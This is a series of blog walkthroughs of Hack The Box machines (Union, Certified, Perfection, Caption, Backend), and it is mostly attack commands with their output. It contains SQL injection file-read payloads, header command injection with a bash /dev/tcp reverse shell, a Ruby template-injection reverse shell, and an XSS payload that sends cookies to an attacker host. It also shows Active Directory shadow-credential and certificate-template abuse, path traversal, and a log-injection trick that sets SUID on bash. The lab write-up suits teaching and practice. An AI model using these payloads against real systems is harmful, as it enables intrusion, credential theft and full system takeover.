OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) Ok now let\u0026rsquo;s continue with the SQLi, first I checked for the other tables and got the users info \u0026#39; UNION select group_concat(player) from players; -- - Output: Sorry, ippsec,celesian,big0us,luska,tinyboy you are not eligible due to already qualifying. Exploitation # This is one of the reasons why sql injection is so dangerous we can read system files using SQLi if it\u0026rsquo;s misconfigured. Using the below payload I got the /etc/passwd file data \u0026#39; UNION select load_file(\u0026#39;/etc/passwd\u0026#39;); -- - Output: Sorry, root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin htb:x:1000:1000:htb:/home/htb:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false uhc:x:1001:1001:,,,:/home/uhc:/bin/bash you are not eligible due to already qualifying. From reading the /etc/passwd file I identified three valid users to access the system\nWe can also read the source code of this page\n\u0026#39; UNION select load_file(\u0026#39;/var/www/html/index.php\u0026#39;); -- - If you remember earlier we found config.php via the directory fuzzing, so let\u0026rsquo;s try getting it \u0026#39; UNION select load_file(\u0026#39;/var/www/html/config.php\u0026#39;); -- - Output: Sorry, \u0026lt;?php session_start(); $servername = \u0026#34;127.0.0.1\u0026#34;; $username = \u0026#34;uhc\u0026#34;; $password = \u0026#34;\u0026lt;redacted\u0026gt;\u0026#34;; $dbname = \u0026#34;november\u0026#34;; $conn = new mysqli($servername, $username, $password, $dbname); ?\u0026gt; you are not eligible due to already qualifying. We got the exposed password from the website configuration. Accessed the system using SSH and got the user flag Privilege Escalation # Quickly I started enumerating and eventually looked into the firewall.php code and I can see the vulnerable code \u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $ip = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } else { $ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; }; system(\u0026#34;sudo /usr/sbin/iptables -A INPUT -s \u0026#34; . $ip . \u0026#34; -j ACCEPT\u0026#34;); ?\u0026gt; This above part is vulnerable to command Injection, after a while I pictured the payload and I tested with this header payload and it worked X-FORWARDED-FOR: 8.8.8.8; wget http://10.10.14.4:8000/Union_AllPorts.txt; Prepared a reverse shell payload and got the shell with this X-FORWARDED-FOR: 8.8.8.8; bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.14.4/6001 \u0026lt;\u0026amp;1\u0026#39;; Upgraded the shell to be more stable using a new technique that I have learnt recently script /dev/null -c bash Then foreground the shell with CTRL+Z stty raw -echo; fg In the shell type this to allign it with our terminal reset Now the shell is upgraded Issued this command sudo -l and found that sudo can be run with anything Now easily ran the bash with root privileges sudo /bin/bash Got the Root flag ","date":"16 March 2025","externalUrl":null,"permalink":"/posts/1741809498520-union-walkthroughhtb/","section":"Posts","summary":"","title":"Union Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance # We got multiple ports open, Which is interesting Out of curiosity I fired up a nmap scan and it turns out there are other ports open too For this box they gave credentials as well Username: judith.mader Password: judith09 Total open ports: Open 10.10.11.41:53 Open 10.10.11.41:88 Open 10.10.11.41:135 Open 10.10.11.41:139 Open 10.10.11.41:389 Open 10.10.11.41:445 Open 10.10.11.41:464 Open 10.10.11.41:593 Open 10.10.11.41:636 Open 10.10.11.41:3268 Open 10.10.11.41:3269 Open 10.10.11.41:5985 Open 10.10.11.41:9389 Open 10.10.11.41:49668 Open 10.10.11.41:49666 Open 10.10.11.41:49673 Open 10.10.11.41:49674 Open 10.10.11.41:49683 Open 10.10.11.41:49716 Open 10.10.11.41:49739 Open 10.10.11.41:59780 Enumeration # As usual for starters I checked the smb shares of user judith netexec smb certified.htb -u judith.mader -p judith09 --shares Smb shares for this user, didn\u0026rsquo;t had anything intersting. As usual I enumerated users from SMB netexec smb certified.htb -u judith.mader -p judith09 --rid-brute \u0026gt;\u0026gt; users-earlier.txt Removed the unnecessary fields from the netexec output cat users-earlier.txt| grep \u0026#34;SidTypeUser\u0026#34; | cut -d \u0026#39;\\\u0026#39; -f 2 | cut -d \u0026#39;(\u0026#39; -f 1 \u0026gt;\u0026gt; users.txt Then I testing for password reuse using password sprying attack netexec smb certified.htb -u users.txt -p judith09 --continue-on-success Got nothing useful, seems It\u0026rsquo;s not that easy Searched LDAP for anything interesting and found nothing ldapsearch -H ldap://certified.htb -D \u0026#39;judith.mader@certified.htb\u0026#39; -w \u0026#39;judith09\u0026#39; -b \u0026#34;DC=certified,DC=htb\u0026#34; | grep \u0026#34;pass\u0026#34; So atlast I collected bloodhound data bloodhound-python -c ALL -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 While analyzing the data I found Interesting things These are my findings: The user Judith has WriteOwner permissions over group MANAGEMENT@CERTIFIED.Hack The Box The group Management@certified.htb has Generic all permission over user management_svc@certified.htb The user MANAGEMENT_SVC@CERTIFIED.Hack The Box has CanPsRemote permission on the Domain controller(This is not quite useful. At the end we will be abusing AD CS instead of this) Exploitation # Time is very crucial for these kind of attacks so synced the time with the target system sudo rdate -n certified.htb WriteOwner Abuse # First we need to be an user of MANAGEMENT@CERTIFIED.Hack The Box Using this command, I can change the ownership of the object to the user which I own owneredit.py -action write -new-owner \u0026#39;judith.mader\u0026#39; -target \u0026#39;Management\u0026#39; \u0026#39;certified.htb/judith.mader:judith09\u0026#39; To abuse ownership of a group object, I need to grant myself the AddMember privilege. Impacket\u0026rsquo;s dacledit can be used for this purpose dacledit.py -action \u0026#39;write\u0026#39; -rights \u0026#39;WriteMembers\u0026#39; -principal \u0026#39;judith.mader\u0026#39; -target-dn \u0026#39;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=Hack The Box\u0026#39; \u0026#39;certified.htb/judith.mader:judith09\u0026#39; Now I can add the user to the group using net tool net rpc group addmem \u0026#34;Management\u0026#34; \u0026#34;judith.mader\u0026#34; -U \u0026#34;certified.htb/judith.mader%judith09\u0026#34; -S \u0026#34;DC01.certified.htb\u0026#34; Now that the user judith has become member of the group MANAGEMENT@CERTIFIED.Hack The Box I can move to the next step GenericWrite Abuse # Definition The bottom line of GenericWrite is \u0026ndash;\u0026gt; Generic Write Abuse is a type of attack in Active Directory (AD) where an attacker with GenericWrite permissions over an object (such as a user, group, or computer) can modify certain attributes of that object to escalate privileges, maintain persistence, or execute malicious commands.\nI can also change the password of the account but for me using Shadow Credentials Technique is optimal\nDefinition Shadow Credentials Attack is a technique used by attackers to gain persistent access to an Active Directory (AD) environment by manipulating key authentication data. It involves exploiting the way AD handles alternative credentials such as key pairs or certificates associated with user or computer accounts. View links Article-1 Article-2\nPerforming shadow credential attack: pywhisker -d certified.htb -u judith.mader -p judith09 --target management_svc --action add Getting the TGT python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx 2QCAj1n0.pfx -pfx-pass AxYpGIRkSbtAKz4T0aJ4 management_svc.ccache Using the TGT cache to get the NT hash KRB5CCNAME=../management_svc.ccache python3 getnthash.py certified.htb/management_svc -key 841420e74637606f21b9eaaec6a8bfd2cc98eff7fb5167daddb131f3127a96b0 Now that I got the hash passing it to login in EvilwinRm as user management_svc evil-winrm -u management_svc -H a091c1832bcdd46\u0026lt;SNIP\u0026gt; -i certified.htb Got access as user management_svc Got the User flag Privilege Escalation # As the machine name suggests, Lets enumerate AD CS using certipy tool In case if you haven\u0026rsquo;t heard about this tool, Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services(AD CS). Certipy can be easily installed using python pip3 install certipy-ad or using pipx pipx install certipy-ad On using certipy I came to know that user ca_operators has esc9 vulnerability certipy find -u management_svc -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.10.11.41 -vulnerable -enabled -old-bloodhound Abusing the AD CS # Note: This requires perfect time coordination and each command execution intervel should not exceed two minutes before executing next command Lets perform shadow credentials on user ca_operators from management_svc user, since I have GenericAll DACL over it. Using shadow technique I got the hash of user ca_operator certipy shadow auto -u management_svc@certified.htb -hashes \u0026lt;hashes\u0026gt; -account ca_operator I changed the user principal to administrator certipy account update -u management_svc@certified.htb -hashes \u0026lt;hash\u0026gt; -user ca_operator -upn administrator Now abuse the template to get administrator pfx certipy req -username ca_operator@certified.htb -hashes \u0026lt;hash\u0026gt; -ca certified-DC01-CA -template CertifiedAuthentication Note: This above step was failing for me with throwing Netbios timeout error. When it worked, It gave me the pfx of user ca_operator, for a weird reason when I redo all the steps from step one it worked. Now I Changed the user principal back to the same certipy account update -u management_svc@certified.htb -hashes \u0026lt;hash\u0026gt; -user ca_operator -upn ca_operator@certified.htb I easily got the administrator NTLM hash from using this command with administrator.pfx certipy auth -pfx administrator.pfx -domain certified.htb Then I logged in with Administrator user\u0026rsquo;s NT part of the hash evil-winrm -u administrator -H \u0026lt;hash\u0026gt; -i certified.htb Got the Root flag ","date":"15 March 2025","externalUrl":null,"permalink":"/posts/1742035934336-certified-walkthroughhtb/","section":"Posts","summary":"","title":"Certified Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance \u0026amp;\u0026amp; Enumeration # Nmap scan results: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA) |_ 256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519) 80/tcp open http nginx | http-methods: |_ Supported Methods: GET HEAD |_http-title: Weighted Grade Calculator Device type: general purpose Running: Linux 5.X OS CPE: cpe:/o:linux:linux_kernel:5 OS details: Linux 5.0 - 5.14 Uptime guess: 15.030 days (since Tue Dec 31 22:06:01 2024) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=259 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel I was hanging around the website to find anything interesting, I am not gonna lie the website is both basic and neat After a while I foud this Weighted grade calculator interesting In the footer of the page it shows/exposes that the website powered by WEBrick 1.7.0. So I noted it down.\nAfter some bunch of research I learnt that WEBrick uses Ruby to run. If I can recall I think there is even a module in ruby named Webrick. I\u0026rsquo;ll leave the details below View the attached Links Link-1 Link-2 Link-3\nLike in python SSTI are possible for Ruby and as this a calculator it gives us more clue to work on that. So I jumped the gun This article showcases the SSTI on a WEBrick made site, talk about being lucky, lol \u0026ndash;\u0026gt; Link here This Medium article helped me a lot with payloads for the ruby SSTI and while I was testing It, I couldn\u0026rsquo;t get any valid results Below contains the example payloads for Ruby. These are some of the payloads that I used for SSTI\n\u0026lt;%= system(\u0026#34;whoami\u0026#34;) %\u0026gt; \u0026lt;%= Dir.entries(\u0026#39;/\u0026#39;) %\u0026gt; \u0026lt;%= File.open(\u0026#39;/example/arbitrary-file\u0026#39;).read %\u0026gt; Exploitation # Some payload worked after little tweaks, But blocked by the web page as Malicious Input anyway. Hey atleast we got something No matter how I URL encode, it didn\u0026rsquo;t even worked. Probably the site blocks the symbols in the payload hmm\u0026hellip; I learnt that URL encoded value of new-line(%0a) helps in bypassing SSTI validation So I used that before the payload as prefix and like a magic it worked The whoami doesn\u0026rsquo;t return any output I tried hitting my machine for a check, and I got the request Request: As everything works fine its time for us to brew the cursed reverse shell payload %0a\u0026lt;%25%3d+system(\u0026#34;bash+-c+\u0026#39;exec+bash+-i+%26\u0026gt;/dev/tcp/10.10.14.10/7001+\u0026lt;%261\u0026#39;\u0026#34;)+%25\u0026gt; It worked and we are as user susan now Secured User flag Privilege Escalation # While enumerating I found two other folders wihin user susan's home directory Migration folder had sqlite database file so for a change I opened the file in the target system itself The database had only one table called users . Inside that table, password hashes for five users were included The hashes were made from using sha256 algorithm I tried cracking the hashes using my tool BananaCracker(Previously sha256_cracker), But it failed Then, I started enumerating system further for privesc vectors and rather I found this /var/mail Inside /var/mail/susan the message reads Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials (\u0026#39;our\u0026#39; including the other students in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is: {firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000} Note that all letters of the first name should be convered into lowercase. Please hit me with updates on the migration when you can. I am currently registering our university with the platform. As per the instructions I created a python script to make password list for user susan output_file = \u0026#34;susan_nasus_password.txt\u0026#34; with open(output_file, \u0026#34;w\u0026#34;) as file: for number in range(1, 1_000_000_001): file.write(f\u0026#34;susan_nasus_{number}\\n\u0026#34;) print(f\u0026#34;File \u0026#39;{output_file}\u0026#39; has been successfully created.\u0026#34;) This would be both easy and fast when using bash for ((i=1; i\u0026lt;=1000000000; i++)); do echo \u0026#34;susan_nasus_$i\u0026#34; \u0026gt;\u0026gt; \u0026#34;$output_file\u0026#34; With the new wordlists I fired up my tool again and got the password You can get my tool from here BananaCracker(Previously known as sha256_cracker). More features will be added by the time of your visit Using the password I logged in via SSH as user susan I really wasn\u0026rsquo;t expecting this twist I was hoping for more steps, anyway I am glad. See this yourself lol User susan can run sudo without any password Got the Root flag ","date":"14 March 2025","externalUrl":null,"permalink":"/posts/1741808245229-perfection-walkthroughhtb/","section":"Posts","summary":"","title":"Perfection Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance # On scanning the ports we can see that there are three ports open We got two web services running. which are on port 80 (caption) and on port 8080 (git bucket) More importantly after some recon I come to know about a login page on port 80 which is caption, however we don\u0026rsquo;t have the credentials yet so I started digging further The Gitbucket on port 8000 had two repos, interesting isn\u0026rsquo;t it The repository files didn\u0026rsquo;t give that much of valuable information. but\u0026hellip; Enumeration # I got tired of the repo files so I checked commits, the recent commits were done by user Administrator where the old were done by user root So I tried enumerating the commits further and on accessing the commit Access control, I saw credentials in the chage Those creds worked on the login page on caption(port 80), So using the creds I was able to log in on Caption-Portal\nIt looked like a typical hack the box page but when I tried accessing /logs from the caption-portal it showed me access denied error. But at initially on seeing it I was happy cause I thought I could have command injection or something. But if you think about it which is unlikely now. After a while, I found that there is a cache server running along with the web server, which is called varnish, Actually we could\u0026rsquo;ve learned about this from the source code(repo) too Varnish Cache is a web application accelerator also known as a caching HTTP reverse proxy. You install it in front of any server that speaks HTTP and configure it to cache the contents.\nApparently this caching server will cache the same page for all users for quick loading of contents\nAgain after a while I found that when using X-Forwaded-Host: header on the request of pages like /home and /firewalls actually loads it\u0026rsquo;s value on the response and caches the same page for everyone(including admin) using varnish caching server. \u0026#34; \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;new Image().src=\u0026#34;https://10.10.14.12:8000/?c=\u0026#34;+document.cookie;\u0026lt;/script\u0026gt; So I made and used the the above xss payload to get admin cookie which was successful. Even after including the admin cookie, still haproxy blocking my request to the page /logs which was frustrating I was searching for a tool to bypass this, fortunatly one friend suggested me this great tool called h2csmuggler and using that tool I was easily able to bypass the 403 of /logs From the response I got the location of logs files After hours of checking the logs files, I came to know that it didn\u0026rsquo;t has anything useful, Full of garbage h2csmuggler.py -x http://caption.htb:80 -H \u0026#39;Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM1NDY5NTAzfQ.KlugtV3zNPowolIMi0EUkDB_CFUx0MdmDSkNWEX1KHo\u0026#39; \u0026#39;http://caption.htb:80/download\u0026lt;redacted\u0026gt; See it\u0026rsquo;s garbage contents yourselves But on visiting the plain url without the logs path it rather reveals something interesting These ./cpr folders are looking interesting aren\u0026rsquo;t they Researched about them and found a vulnerability in copyparty, Which includes a path traversal vulnerability on versions 1.8.2 The POC looked like this: curl -i -s -k -X GET \u0026#39;http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd\u0026#39; The above path also has SSRF vulnerability Exploitation # Using this plainly didn\u0026rsquo;t work for me But with little twerk, actually have to double encode the payload This was my initial payload to read /etc/passwd .cpr//etc/passwd The Final URL encoded payload: %2e%63%70%72%2f%25%32%46%65%74%63%25%32%46%70%61%73%73%77%64 As this was working, for SSH access I tried to read id_rsa for user margo and got nothing, then after some hours I figured that it\u0026rsquo;s not a RSA key that I should look for\u0026hellip; /.cpr//home/margo/.ssh/id_ecdsa Logged in with the key and got the User flag Don\u0026rsquo;t worry guys we are halfway through Privilege Escalation # I started enumerating with internal services and we got multiple services but one looks particularly interesting ss -tunlp The reason is, there is a code mentioning about port 9090 within the gitbucket\u0026rsquo;s Logservice repo So as usual as I reverse forwarded that particular service port to my host machine There were no interface I was stuck here so I researched the repo again and learned about Thrift. Where Thrift is used to connect with log services. Researched on Thrift View articles Link-1 Link-2\nAlso after some further enumeration and code review I found a really bad code on the log service This regex code snippet reads a arbitary log file and takes the values of User-Agent from, it takes timestamp\u0026rsquo;s value. Also it notes the IP address which is not potential for this context This can be exploited by injecting a command within the user agent of log files. As the code configured to read the user-agent value, the injected command would be executed. For this to be done we need Thrift installed on the local machine. Then we need a client on the local machine to tell the Log service to read our malicious file on the target using thrift. When it reads the log file our command will be executed. So I installed Thrift using pip3 pip3 install thrift To create the client, first we have to create an api configuration file for the client Created a file named api2.thrift with this following code namespace py log_service exception LogServiceException { 1: string message } service LogService { /** * Reads the log file from the specified file path. * @param filePath - The path of the log file to read. * @return string - A message indicating the processing status. * @throws LogServiceException - If an error occurs during processing. */ string ReadLogFile(1: string filePath) throws (1: LogServiceException error) } Installed compiler using sudo apt install thrift-compiler although not recommended Ran the following command and created modules directory in python language thrift --gen py api2.thrift Inside the directory I created client.py file with this code from thrift import Thrift from thrift.transport import TSocket from thrift.transport import TTransport from thrift.protocol import TBinaryProtocol from log_service import LogService # Import generated Thrift client code def main(): # Set up a transport to the server transport = TSocket.TSocket(\u0026#39;localhost\u0026#39;, 9090) # Buffering for performance transport = TTransport.TBufferedTransport(transport) # Using a binary protocol protocol = TBinaryProtocol.TBinaryProtocol(transport) # Create a client to use the service client = LogService.Client(protocol) # Open the connection transport.open() try: # Specify the log file path to process log_file_path = \u0026#34;/tmp/bad.log\u0026#34; # Call the remote method ReadLogFile and get the result response = client.ReadLogFile(log_file_path) print(\u0026#34;Server response:\u0026#34;, response) except Thrift.TException as tx: print(f\u0026#34;Thrift exception: {tx}\u0026#34;) # Close the transport transport.close() if __name__ == \u0026#39;__main__\u0026#39;: main() After that I created two files One is bad.log file with this as content 999.9.9.9 \u0026#34;user-agent\u0026#34;:\u0026#34;\u0026#39;; /bin/bash /tmp/bad.sh #\u0026#34; Second is bad.sh file with this chmod +s /bin/bash Transferred both the files to the /tmp folder of the target system and also gave appropriate permissions From the host hosted a python server From the target system All complications are over. By now if client.py is executed it will speak with the Log-service and make it to read the file /tmp/bad.log As the file contains malicious code. It will make the Log-service to execute a script named bad.sh as root. The script will give SUID permissions to /bin/bash making it to be executed as root by anyone. Fired the script successfully Our exploit worked\u0026hellip;. It was a success Executing the /bin/bash with preserve flag -p gave a shell as root. Finally got the Root flag Feedback: This box was awesome at same time it was a misery. It took me 5 days to pwn this box. ","date":"12 March 2025","externalUrl":null,"permalink":"/posts/1741762551259-caption-walkthroughhtb/","section":"Posts","summary":"","title":"Caption Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance \u0026amp; Enumeration # Nmap scan results: 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http Uvicorn |_http-title: Site doesn\u0026#39;t have a title (application/json). | http-methods: |_ Supported Methods: GET Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.19 Uptime guess: 17.734 days (since Sun Feb 16 04:30:26 2025) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=255 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 265.74 ms 10.10.14.1 2 265.82 ms 10.10.11.161 After hours of fuzzing I found multiple endpoints, where by simply playing with endpoints in burp we can reveal more. But one in particular /docs asks for authentication cookie. We can also do directory fuzzing in recursive mode with any tool but I personally found the endpoints just by guessing them. There is one signup endpoint which is api/v1/user/signup. Using this endpoint I can create an account. After enumerating further on that endpoint I found all the data parameters of it. Now I can create an account using this curl -v -X POST \u0026#39;http://10.10.11.161/api/v1/user/signup\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;email\u0026#34;:\u0026#34;Emp5r0R@king.com\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;}\u0026#39; | jq Eventually I found another endpoint which is /login. But initially it was showing error on sending the json data but it turns out this endpoint only accept HTML data. I curled the endpoint curl -v \u0026#39;http://10.10.11.161/api/v1/user/login\u0026#39; -d \u0026#39;username=Emp5r0R@king.com\u0026amp;password=password\u0026#39; | jq . In return I got the JWT token Curl Output: I used this extension to modify the header, I could\u0026rsquo;ve used burp interceptor but for some reason it didn\u0026rsquo;t worked for me as intended. I tried to access /docs endpoint with providing the token, After including it, I was redirected to FastAPI interface. Surpisingly,SecretFlagEndpoint straight out gave User flag I didn\u0026rsquo;t expect this After some enumeration I found this endpoint /api/v1/user/0 which on modifying the Id parameter spits out user information. This Id 1 gave me the admin details.\ncurl -X \u0026#39;GET\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/user/1\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; | jq I can change password of any user If I had guid, As I already have the guid of user admin I can change admin account\u0026rsquo;s password by curling this endpoint /api/v1/user/updatepass with valid data. curl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/user/updatepass\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Content-Type: application/json\u0026#39; \\ -d \u0026#39;{ \u0026#34;guid\u0026#34;: \u0026#34;36c2e94a-4271-4259-93bf-c96ad5948284\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;emperor\u0026#34; }\u0026#39; Using the newly changed password I authorized myself with FastAPI Now I can access admin endpoints as I am an admin now to FastAPI Here the endpoint file seems to be useful, actually I can read arbitary files using this endpoint. First let me try and access /etc/passwd\ncurl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/admin/file\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE\u0026#39; \\ -H \u0026#39;Content-Type: application/json\u0026#39; \\ -d \u0026#39;{ \u0026#34;file\u0026#34;: \u0026#34;/etc/passwd\u0026#34; }\u0026#39; | jq It was successfull However when I try to run commands using this endpoint /api/v1/admin/exec/\u0026lt;commands\u0026gt; I get this error. Hmm\u0026hellip; what could it be 🤔 From /etc/passwd I got to know that user htb has bash access. Exploitation # To identify the web application running directory I can request to read this file path /proc/self/environ. From reading the file I identified the running directory of this web. curl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/admin/file\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE\u0026#39; \\ -H \u0026#39;Content-Type: application/json\u0026#39; \\ -d \u0026#39;{ \u0026#34;file\u0026#34;: \u0026#34;/proc/self/environ\u0026#34; }\u0026#39; | jq -r \u0026#39;.file\u0026#39; The path should be this /home/htb/uhc/app/main.py I requested for the source code using file endpoint and got it import asyncio from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends from fastapi_contrib.common.responses import UJSONResponse from fastapi import FastAPI, Depends, HTTPException, status from fastapi.security import HTTPBasic, HTTPBasicCredentials from fastapi.openapi.docs import get_swagger_ui_html from fastapi.openapi.utils import get_openapi from typing import Optional, Any from pathlib import Path from sqlalchemy.orm import Session from app.schemas.user import User from app.api.v1.api import api_router from app.core.config import settings from app import deps from app import crud app = FastAPI(title=\u0026#34;UHC API Quals\u0026#34;, openapi_url=None, docs_url=None, redoc_url=None) root_router = APIRouter(default_response_class=UJSONResponse) @app.get(\u0026#34;/\u0026#34;, status_code=200) def root(): \u0026#34;\u0026#34;\u0026#34; Root GET \u0026#34;\u0026#34;\u0026#34; return {\u0026#34;msg\u0026#34;: \u0026#34;UHC API Version 1.0\u0026#34;} @app.get(\u0026#34;/api\u0026#34;, status_code=200) def list_versions(): \u0026#34;\u0026#34;\u0026#34; Versions \u0026#34;\u0026#34;\u0026#34; return {\u0026#34;endpoints\u0026#34;:[\u0026#34;v1\u0026#34;]} @app.get(\u0026#34;/api/v1\u0026#34;, status_code=200) def list_endpoints_v1(): \u0026#34;\u0026#34;\u0026#34; Version 1 Endpoints \u0026#34;\u0026#34;\u0026#34; return {\u0026#34;endpoints\u0026#34;:[\u0026#34;user\u0026#34;, \u0026#34;admin\u0026#34;]} @app.get(\u0026#34;/docs\u0026#34;) async def get_documentation( current_user: User = Depends(deps.parse_token) ): return get_swagger_ui_html(openapi_url=\u0026#34;/openapi.json\u0026#34;, title=\u0026#34;docs\u0026#34;) @app.get(\u0026#34;/openapi.json\u0026#34;) async def openapi( current_user: User = Depends(deps.parse_token) ): return get_openapi(title = \u0026#34;FastAPI\u0026#34;, version=\u0026#34;0.1.0\u0026#34;, routes=app.routes) app.include_router(api_router, prefix=settings.API_V1_STR) app.include_router(root_router) def start(): import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8001, log_level=\u0026#34;debug\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: # Use this for debugging purposes only import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8001, log_level=\u0026#34;debug\u0026#34;) This is just a basic code let\u0026rsquo;s analyze other files. From the import headers I can learn about other file locations. from app.schemas.user import User from app.api.v1.api import api_router from app.core.config import settings On requesting/app/core/config.py I got the jwt secret from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator from typing import List, Optional, Union from enum import Enum class Settings(BaseSettings): API_V1_STR: str = \u0026#34;/api/v1\u0026#34; JWT_SECRET: str = \u0026#34;SuperSecretSigningKey-Hack The Box\u0026#34; ALGORITHM: str = \u0026#34;HS256\u0026#34; # 60 minutes * 24 hours * 8 days = 8 days 